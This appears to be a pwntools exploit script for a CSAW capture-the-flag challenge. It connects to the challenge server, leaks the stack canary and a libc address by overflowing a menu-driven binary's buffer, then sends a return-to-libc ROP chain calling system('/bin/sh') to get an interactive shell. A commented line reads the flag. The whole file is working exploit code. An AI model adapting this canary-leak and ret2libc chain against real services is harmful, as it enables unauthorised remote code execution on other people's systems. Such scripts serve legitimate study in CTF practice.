import os
import sys
from pwn import *

__author__ = 'b1gtang'

context.log_level = 'info'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

L = False # local or remote
E = True # set env

BIN_NAME = sys.argv[1]
BIN_BASE = 0x0000555555554000

LIBC32_L = '/lib/i386-linux-gnu/libc.so.6'
LIBC32_R = './libc_32.so.6'
LIBC64_L = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC64_R = './libc_64.so.6'

if E:
    os.environ['LD_PRELOAD'] = './libc.so.6'

if L:
    libc = ELF('./libc.so.6')
    r = process(BIN_NAME)
else:
    libc = ELF('./libc.so.6')
    r = remote('pwn.chal.csaw.io',3764)

#gdb.attach(r, execute='b *0x%x' % (0x000000000400CCE))
# gdb.attach(r, execute='b *0x%x' % (0x0000000000001201))

r.recvuntil('>>')
r.sendline('1')
r.recvuntil('>>')
r.sendline('a'*0xa8)

r.recvuntil('>>')
r.sendline('2')
r.recvuntil('aaaa\n')
canary = r.recv(7)
print canary.encode('hex')

r.recvuntil('>>')
r.sendline('1')
r.recvuntil('>>')
r.sendline('a'*(0xb8-1))

r.recvuntil('>>')
r.sendline('2')
r.recvuntil('aaaa\n')
data = r.recv(6)+'\x00\x00'
libc_base = u64(data)-0x20830
print hex(libc_base)

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()
print hex(system_addr)
print hex(bin_sh_addr)

r.recvuntil('>>')
r.sendline('1')
r.recvuntil('>>')
r.sendline('a'*0xa8+'\x00'+canary+'b'*8+p64(0x0000000000400ea3)+p64(bin_sh_addr)+p64(system_addr))

r.interactive()
#r.sendline('cat /*/*/flag')
